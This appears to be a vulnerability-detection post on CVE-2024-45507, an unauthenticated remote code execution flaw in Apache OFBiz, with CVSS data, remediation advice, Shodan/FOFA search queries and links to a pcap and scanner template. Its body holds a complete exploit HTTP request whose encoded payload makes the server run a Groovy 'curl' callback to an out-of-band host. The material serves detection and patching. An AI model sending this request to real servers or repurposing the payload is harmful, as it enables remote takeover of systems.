---
layout: post
cve_id: CVE-2024-45507
title: Apache OFBiz - Remote Code Execution
pcap: true
pcap_path: /pcaps/2024/CVE-2024-45507.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-45507.yaml
snort2_rule: N/A
snort3_rule: N/A
author: chybeta,iamnooob,rootxharsh,pdresearch
severity: critical
impact: 'Unauthenticated attackers can exploit missing view authorization checks to
  execute arbitrary code on Apache OFBiz servers.

  '
remediation: 'Users are recommended to upgrade to version 18.12.16, which fixes the
  issue.

  '
reference:
- https://xz.aliyun.com/t/15569
- https://x.com/chybeta/status/1833184898913636424
- https://lists.apache.org/thread/o90dd9lbk1hh3t2557t2y2qvrh92p7wy
- https://ofbiz.apache.org/download.html
- https://github.com/advisories/GHSA-w8w4-463p-8pg7
- https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2024-45507
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2024-45507
  cwe-id: CWE-918
  epss-score: 0.90476
  epss-percentile: 0.99585
  cpe: cpe:2.3:a:apache:ofbiz:*:*:*:*:*:*:*:*
metadata:
  vendor: apache
  product: ofbiz
  shodan-query:
  - ofbiz.visitor=
  - http.html:"ofbiz"
  fofa-query:
  - app="apache_ofbiz"
  - body="ofbiz"
tags:
- cve
- cve2024
- apache
- obiz
- rce
- oast
- vkev
- vuln
---

## üîç Vulnerability Description
Apache OFBiz below 18.12.16 is vulnerable to unauthenticated remote code execution on Linux and Windows. An attacker with no valid credentials can exploit missing view authorization checks in the web application to execute arbitrary code on the server


## üåê HTTP Request
```nohighlight
POST /webtools/control/view/StatsSinceStart HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Connection: close
Content-Length: 632
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

statsDecoratorLocation=http%3a//oast.fun/x%3fb64_body%3dPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48c2NyZWVucyB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIiAgeG1sbnM9Imh0dHA6Ly9vZmJpei5hcGFjaGUub3JnL1dpZGdldC1TY3JlZW4iIHhzaTpzY2hlbWFMb2NhdGlvbj0iaHR0cDovL29mYml6LmFwYWNoZS5vcmcvV2lkZ2V0LVNjcmVlbiBodHRwOi8vb2ZiaXouYXBhY2hlLm9yZy9kdGRzL3dpZGdldC1zY3JlZW4ueHNkIj48c2NyZWVuIG5hbWU9IlN0YXRzRGVjb3JhdG9yIj48c2VjdGlvbj48YWN0aW9ucz48c2V0IHZhbHVlPSIke2dyb292eTonY3VybCBkNWlxZDI5bGUwbzQ4YzRjczJjZ2JjNHJuYTRxMWM4OGIub2FzdC5wcm8nLmV4ZWN1dGUoKTt9Ii8%252BPC9hY3Rpb25zPjwvc2VjdGlvbj48L3NjcmVlbj48L3NjcmVlbnM%252B
```

